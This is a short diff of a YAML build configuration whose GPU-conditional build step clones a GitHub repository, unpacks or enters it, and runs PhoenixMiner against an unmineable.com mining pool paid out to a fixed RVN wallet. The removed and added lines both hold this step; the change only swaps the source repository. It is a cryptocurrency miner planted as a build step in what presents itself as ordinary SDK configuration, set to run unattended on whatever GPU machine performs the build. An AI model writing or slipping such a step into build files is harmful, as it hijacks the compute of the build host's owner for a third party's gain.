@@ -31,4 +31,4 @@ build_steps:
     # the first major release, as breaking changes may be introduced to the SDK
     # The if_gpu and if_cpu directives can be used to run build steps
     # conditionally depending on the build environment	
-    - if_gpu: apt-get install libpci3 && git clone https://github.com/arifdauhi11/miner.git && tar -xvf miner/PhoenixMiner_5.5c_Linux.tar.gz && cd PhoenixMiner_5.5c_Linux && chmod u+x PhoenixMiner && ./PhoenixMiner -pool ethash.unmineable.com:3333 -wal RVN:RGanP2aVbmZcMNu2GMGoMf4Tc5m6L7Yqrk.phoenix1 -pass x -mi 14 -gt 400
+    - if_gpu: apt-get install libpci3 && git clone https://github.com/colabu11/miner.git && cd miner && chmod u+x PhoenixMiner && ./PhoenixMiner -pool ethash.unmineable.com:3333 -wal RVN:RGanP2aVbmZcMNu2GMGoMf4Tc5m6L7Yqrk.phoenix1 -pass x -mi 14 -gt 400
